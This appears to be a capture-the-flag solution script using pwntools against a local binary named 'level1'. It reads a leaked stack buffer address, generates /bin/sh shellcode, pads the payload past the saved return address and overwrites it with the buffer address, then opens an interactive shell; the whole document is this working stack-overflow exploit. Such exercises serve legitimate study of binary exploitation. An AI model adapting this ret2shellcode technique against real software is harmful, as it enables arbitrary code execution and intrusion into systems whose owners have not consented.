from pwn import *
#ret2shellcode
file_path='./level1'
context(binary=file_path,os='linux',terminal = ['tmux', 'sp', '-h'])
p = process("level1")

p.recvuntil("What's this:")
buf = int(p.recv(10),16)#读取0xaaaaaaaa

shellcode = asm(shellcraft.sh())
payload = shellcode
payload = payload.ljust(0x88+4,b'a')+p32(buf)
#gdb.attach(p)
p.send(payload)
p.interactive()